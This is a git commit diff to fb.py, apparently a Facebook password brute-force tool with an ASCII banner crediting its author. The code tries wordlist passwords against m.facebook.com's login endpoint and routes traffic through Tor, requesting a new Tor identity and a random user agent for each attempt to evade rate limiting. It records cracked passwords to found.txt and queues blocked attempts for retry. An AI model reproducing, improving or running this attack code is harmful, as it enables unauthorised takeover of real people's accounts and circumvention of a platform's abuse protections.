d47a79a2b9c6f918792eec0bd2ec0ddc4d71d28b
Gray Programmerz <hackrefisher@gmail.com>
2019-11-04 13:21:36 +0500

    Update fb.py

--- fb.py
+++ fb.py
@@ -3,18 +3,13 @@ from stem import Signal
 from stem.control import Controller
 from bs4 import BeautifulSoup
 requests.packages.urllib3.disable_warnings()
-os.system('service tor start')
-proxy,post_url,headers,payload,cookie={"http":"socks5://localhost:9050","https":'socks4://localhost:9050'},'https://m.facebook.com/login.php',{'User-Agent':random.choice(open('user-agents.txt').read().splitlines()),'Accept-Language':'en-US,en;q=0.5'},{},{}
-
-
-
-os.system('clear')
+os.system('service tor start && clear')
 print("\033[1m\033[91m  █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ \n▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ \n▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   \n░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ \n░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒\n ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░\n ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░\n ░ ░     ░   ▒   ░           ░    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░\n \033[97mCoded by : http://github.com/graysuit\n Meet him : http://fb.com/gray.programmerz.5 \n Wordlist Generator : http://github.com/graysuit/wGen")
 email,wlist,IP=input(' \033[92m[+] Enter Username : '),input(' [+] Enter Wordlist name, Default:password.txt : '),input(' [+] Should I display Public IP? Default:y, y/n : ')
 print(' [+] Removing duplicate words in '+wlist+'\n [+] Only passwords >= 6 will be used.\n [+] Open response.txt to view complete responses by facebook.')
 l = 1
 if IP == 'n' or IP == 'N':l = ''
-if os.path.exists('response.txt'):os.remove('response.txt')
+if os.path.exists(email+'response.txt'):os.remove(email+'response.txt')
 if wlist=='':wlist='password.txt'
 if not os.path.exists(wlist):quit(' \033[91m[-] '+wlist+' doesn\'t exits\033[97m')
 print('\033[97m')
@@ -31,14 +26,15 @@ with open(wlist,'r') as h:
     g = len(h.readlines())
 s = open(wlist,'r')
 k=0
-
+proxy,post_url,payload,cookie={"http":"socks5://localhost:9050","https":'socks4://localhost:9050'},'https://m.facebook.com/login.php',{},{}
 def function(email,passw):
+	headers = {'User-Agent':random.choice(open('user-agents.txt').read().splitlines()),'Accept-Language':'en-US,en;q=0.5'}
 	payload['email'] = email
 	payload['pass'] = passw
 	e = ''
 	if l == 1:e = requests.get('https://api.ipify.org',proxies=proxy,verify=False).text
 	with Controller.from_port(port = 9051) as c:
-		c.authenticate(password='Heroof2018')
+		c.authenticate()
 		c.signal(Signal.NEWNYM)
 		A=requests.post(post_url,data=payload,headers=headers,proxies=proxy,verify=False)				
 		soup = BeautifulSoup(re.sub("</"," </", A.text),"lxml")
@@ -50,7 +46,7 @@ def function(email,passw):
 			open('found.txt','a').write('\nUsername='+email+' Password='+passw)
 			quit('\n \033[1;32m[+] Congrats!!! Password is : '+passw+' [+] Saved : found.txt\n\n')
 		elif'Please try again later'in clean or 'You Can\'t Do That Right Now' in  clean:
-			open('left_password.txt','a').write(passw+'\n')
+			open(email+'left_password.txt','a').write(passw+'\n')
 			print('\033[93m [+] IP used so much.\n [+] Password Saved in left_password.txt')
 			m = input(' [+] Enter minutes to sleep for or nothing for no sleep : ')
 			if(m.isdigit()):
